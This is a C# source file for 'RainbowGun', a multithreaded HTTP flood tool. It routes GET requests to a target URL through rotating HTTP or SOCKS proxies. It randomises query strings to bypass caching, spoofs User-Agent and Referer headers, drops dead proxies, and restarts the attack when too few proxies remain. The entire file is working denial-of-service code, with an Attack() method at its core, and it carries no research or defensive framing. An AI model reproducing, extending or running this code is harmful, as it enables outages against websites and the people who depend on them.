using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using xNet;
using xNet.Net;
using xNet.Threading;

namespace RainbowGun
{
    public class RainbowGun
    {
        private readonly string _target;
        private readonly int _threads = -1;

        private readonly string _proxiesFile;
        private readonly string _proxiesType = "http";
        private int _proxiesWaitDelay = 15000;
        private List<string> _proxies;
        private int _criticalProxiesCount = 10;

        private readonly int _delay;
        private readonly bool _randomString;
        private readonly bool _deleteBad;
        private bool _debug;

        private MultiThreading _mt;

        private readonly List<string> _useragentList = new List<string>();
        private readonly List<string> _refererList = new List<string>();

        public RainbowGun(string target, string proxiesFile, int threads, string proxies_type = "http", int delay = 0, bool random_string = true, bool delete_bad = true)
        {
            _target = target;
            _proxiesFile = proxiesFile;
            _threads = threads;
            _delay = delay;
            _randomString = random_string;
            _deleteBad = delete_bad;
            if (proxies_type == "http" || proxies_type == "socks4" || proxies_type == "socks4a" ||
                proxies_type == "socks5")
            {
                _proxiesType = proxies_type;
            }
            SetUserAgentList();
            SetRefererList();

        }

        public void Attack()
        {
            GetProxies();
            if (_proxies.Count != 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\nLoaded {0} proxies!\n", _proxies.Count);
                Console.ResetColor();
                _mt = new MultiThreading((_threads == -1) ? _proxies.Count : _threads);
                _mt.Run(AttackThread);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("All {0} threads started!", _mt.ThreadCount);
                Console.ResetColor();

                while (_mt.Working)
                {
                    if (_proxies.Count <= _criticalProxiesCount)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("CRITICAL PROXY COUNT! RESTART INITIALIZED!");
                        Console.ResetColor();
                        Stop();  
                        break;
                    }
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("ALL THREADS STOPPED!");
                Console.ResetColor();
                Console.ReadKey();
                Attack();
            }
            else
            {
                Console.WriteLine("No proxies!");
            }
        }

        public void Stop()
        {
            _mt.Cancel();
        }

        private void AttackThread()
        {
            string attackTarget = null;
            string proxy = null;
            while (_mt.Canceling != true)
            {
                if (_proxies.Count > 0)
                {
                    try
                    {
                        proxy = _proxies[Rand.Next(0, (_proxies.Count) - 1)];

                        if (proxy != null)
                        {
                            using (var request = new HttpRequest())
                            {
                                switch (_proxiesType)
                                {
                                    case "http":
                                        request.Proxy = HttpProxyClient.Parse(proxy);
                                        break;
                                    case "socks4":
                                        request.Proxy = Socks4ProxyClient.Parse(proxy);
                                        break;
                                    case "socks4a":
                                        request.Proxy = Socks4aProxyClient.Parse(proxy);
                                        break;
                                    case "socks5":
                                        request.Proxy = Socks5ProxyClient.Parse(proxy);
                                        break;
                                    default:
                                        request.Proxy = HttpProxyClient.Parse(proxy);
                                        break;
                                }

                                if (_randomString)
                                {
                                    //attack_target = target + "/" + GetRandomString(Rand.Next(0, 16));
                                    attackTarget = _target + "?" + GetRandomString(Rand.Next(3, 10)) + "=" +
                                                    GetRandomString(Rand.Next(3, 10));
                                }

                                request.Proxy.ConnectTimeout = _proxiesWaitDelay;
                                request.AddHeader("User-Agent", _useragentList[Rand.Next(0, _useragentList.Count - 1)]);
                                request.AddHeader("Cache-Control", "no-cache");
                                request.AddHeader("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
                                request.AddHeader("Referer",
                                    _refererList[Rand.Next(0, _refererList.Count - 1)] +
                                    GetRandomString(Rand.Next(5, 10)).ToUpper());
                                request.AddHeader("Keep-Alive", Rand.Next(110, 120).ToString());
                                request.KeepAlive = true;

                                Console.WriteLine("{0} - [{1}]", proxy, (int)request.Get(attackTarget).StatusCode);

                            }
                        }
                        Thread.Sleep(_delay);
                    }
                    catch (ProxyException pex)
                    {
                        Console.WriteLine(pex.StackTrace);
                        Console.WriteLine(pex.Message);
                        if (_deleteBad && proxy != null)
                        {
                            _proxies.Remove(proxy);
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("Deleted proxy {0}", proxy);
                            Console.WriteLine("Proxies left: {0}",_proxies.Count);
                            Console.ResetColor();
                        }
                        return;
                    }
                    catch (HttpException hex)
                    {
                        switch ((int)hex.HttpStatusCode)
                        {
                            case 500:
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
                                Console.ResetColor();
                                break;
                            case 0:
                                if (_deleteBad && proxy != null)
                                {
                                    _proxies.Remove(proxy);
                                    Console.ForegroundColor = ConsoleColor.Yellow;
                                    Console.WriteLine("Deleted proxy {0}", proxy);
                                    Console.WriteLine("Proxies left: {0}", _proxies.Count);
                                    Console.ResetColor();
                                }
                                return;
                            default:
                                Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                else
                {
                    Console.WriteLine("No proxies found! Attack impossible!");
                }
            }
        }

        private void GetProxies()
        {
            var proxy = new Proxy(_proxiesFile, _proxiesType, _debug, _proxiesWaitDelay);
            _proxies = proxy.GetGoodProxies();
        }

        #region SetParametres

        public void SetProxiesTimeout(int pdelay)
        {
            _proxiesWaitDelay = pdelay;
        }

        public void SetDebug(bool debug)
        {
            _debug = debug;
        }

        public void SetCriticalProxiesCount(int count)
        {
            _criticalProxiesCount = count < 0 ? 0 : count;
        }

        #endregion

        private static string GetRandomString(int size)
        {
            var builder = new StringBuilder();
            var random = new Random();
            for (int i = 0; i < size; i++)
            {
                if (random.Next() % 2 == 0)
                {
                    var ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                    builder.Append(ch);
                }
                else
                {
                    builder.Append(random.Next(0, 9));
                }
            }
            return builder.ToString().ToLower();
        }

        private void SetUserAgentList()
        {
            _useragentList.Add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
            _useragentList.Add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
            _useragentList.Add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
            _useragentList.Add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1");
            _useragentList.Add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1");
            _useragentList.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)");
            _useragentList.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
            _useragentList.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)");
            _useragentList.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)");
            _useragentList.Add("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)");
            _useragentList.Add("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)");
            _useragentList.Add("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
        }

        private void SetRefererList()
        {
            _refererList.Add("http://www.google.com/?q=");
            _refererList.Add("http://www.usatoday.com/search/results?q=");
            _refererList.Add("http://engadget.search.aol.com/search?q=");
            _refererList.Add("http://go.mail.ru/search?q=");
            _refererList.Add("http://rambler.ru/?query=");
            _refererList.Add("http://yandex.ru/yandsearch?text=");
            _refererList.Add("http://sputnik.ru/search?q=");
        }
    }
}
